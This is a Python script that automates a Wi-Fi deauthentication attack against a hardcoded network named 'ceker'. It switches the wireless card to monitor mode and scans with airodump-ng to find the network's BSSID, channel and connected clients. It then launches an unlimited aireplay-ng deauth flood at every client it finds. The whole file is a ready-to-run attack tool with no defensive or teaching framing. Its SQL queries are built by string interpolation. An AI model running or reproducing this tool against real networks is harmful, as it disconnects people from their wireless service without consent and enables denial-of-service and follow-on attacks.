import subprocess
import os
import time
import sqlite3


wifi_name = 'ceker'

def getInterfaceName():
    process_of_interface_output = subprocess.getoutput("iw dev | grep Interface")
    interface_name = process_of_interface_output.split("\n")[0]  # Searching for interface name
    interface_name = interface_name[11:]  # Getting the name only

    return interface_name

def changeMod(interface_name):
    os.system("airmon-ng start " + interface_name)

def isMonitor():
    process_of_type_output = subprocess.getoutput("iw dev | grep type")
    type_of_card = process_of_type_output.split("\n")[0]
    type_of_card = type_of_card[7:]
    print(type_of_card)
    if type_of_card == 'monitor':
        return True
    if type_of_card == 'managed':
        print("You may want change your type of network card manually.")
        return False

def scanNetwork(interface_name_monitor):
    print("Scanning...")
    files_first = os.listdir("./firstScan")
    number_of_files_first = len(files_first)
    os.system(f"timeout -s 9 10 airodump-ng -w ./firstScan/output_of_scan{number_of_files_first} --output-format kismet.csv {interface_name_monitor}")


def getData(db_name):
    conn = sqlite3.connect(db_name)
    c = conn.cursor()

    bssid = f"""SELECT bssid FROM dump WHERE ESSID ='{wifi_name}'"""
    c.execute(bssid)
    bssid = c.fetchone()[0]

    channel = f"""SELECT channel FROM dump WHERE ESSID ='{wifi_name}'"""
    c.execute(channel)
    channel = c.fetchone()[0]

    return bssid, channel

def scanDevices(interface_name_monitor, bssid, channel):
    print("Scanning...")
    channel = str(channel)
    files_second = os.listdir("./secondScan")
    number_of_files_second = len(files_second)
    os.system(f"timeout -s 9 10 airodump-ng -c {channel} --bssid {bssid} -w ./secondScan/output_of_scan{number_of_files_second} --output-format csv {interface_name_monitor}")

def getMACs(db_name):

    conn = sqlite3.connect(db_name)
    c = conn.cursor()

    macs = f"""SELECT StationMAC FROM dump"""
    c.execute(macs)
    macs = c.fetchall()

    return macs


def drop(device_mac, network_mac, interface_name_monitor):
    print(device_mac)
    os.system(f"gnome-terminal -- aireplay-ng -0 0 -a {network_mac} -c {device_mac} --ignore-negative-one {interface_name_monitor}")



interface_name = getInterfaceName()
print(interface_name)


changeMod(interface_name)

if isMonitor():
    print("The mode has changed to monitor instead of managed.")
    interface_name_monitor = interface_name

    ## FIRST SCAN
    scanNetwork(interface_name_monitor)
    files_first = os.listdir("./firstScan")
    number_of_files_first = len(files_first)
    os.system(f"./kismet2sqlite.sh ./firstScan/output_of_scan{number_of_files_first - 1}-01.kismet.csv")
    print("Creating db...")
    time.sleep(3)
    os.system(f"rm -r ./firstScan/output_of_scan{number_of_files_first - 1}-01.kismet.csv")

    db_name = f"./firstScan/output_of_scan{number_of_files_first - 1}-01.kismet.csv.db"
    bssid, channel = getData(db_name)
    print(bssid, channel)



    # SECOND SCAN
    scanDevices(interface_name_monitor, bssid, channel)
    files_second = os.listdir("./secondScan")
    number_of_files_second = len(files_second)
    os.system(f"./kismet3sqlite.sh ./secondScan/output_of_scan{number_of_files_second - 1}-01.csv")
    print("Creating db...")
    time.sleep(3)
    os.system(f"rm -r ./secondScan/output_of_scan{number_of_files_second - 1}-01.csv")

    db_name = f"./secondScan/output_of_scan{number_of_files_second - 1}-01.csv.db"
    macs = getMACs(db_name)
    print(macs)
    for mac in macs:
        mac = str(mac)
        mac = mac[2:19]
        print(mac)
        if len(mac) == 17:
            drop(mac, bssid, interface_name_monitor)
        else:
            print("Problem with mac")

    print("ok")

else:
    print("The mode has NOT changed to monitor instead of managed.\nYou may want change your type of network card manually.")

